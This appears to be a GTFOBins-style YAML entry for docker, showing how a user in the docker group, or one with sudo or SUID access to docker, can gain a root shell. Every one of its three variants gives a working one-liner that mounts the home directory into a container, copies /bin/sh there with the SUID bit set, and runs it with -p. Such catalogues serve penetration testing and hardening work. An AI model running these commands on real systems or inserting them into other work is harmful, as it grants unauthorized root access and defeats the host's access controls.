---
description: |
  Exploit the fact that Docker runs as root to create a SUID binary on the host using a container. This requires the user to be privileged enough to run docker, i.e., being in the `docker` group.

  This creates a SUID shell in the guest file system. Any other Linux images should work, e.g., `debian`.
functions:
  execute-interactive:
    - code: |
        docker run --rm -v /home/$USER:/h_docs ubuntu \
            sh -c 'cp /bin/sh /h_docs/sh && chmod +s /h_docs/sh' && ~/sh -p
  sudo-enabled:
    - code: |
        sudo docker run --rm -v /home/$USER:/h_docs ubuntu \
            sh -c 'cp /bin/sh /h_docs/sh && chmod +s /h_docs/sh' && ~/sh -p
  suid-enabled:
    - code: |
        ./docker run --rm -v /home/$USER:/h_docs ubuntu \
            sh -c 'cp /bin/sh /h_docs/sh && chmod +s /h_docs/sh' && ~/sh -p
---
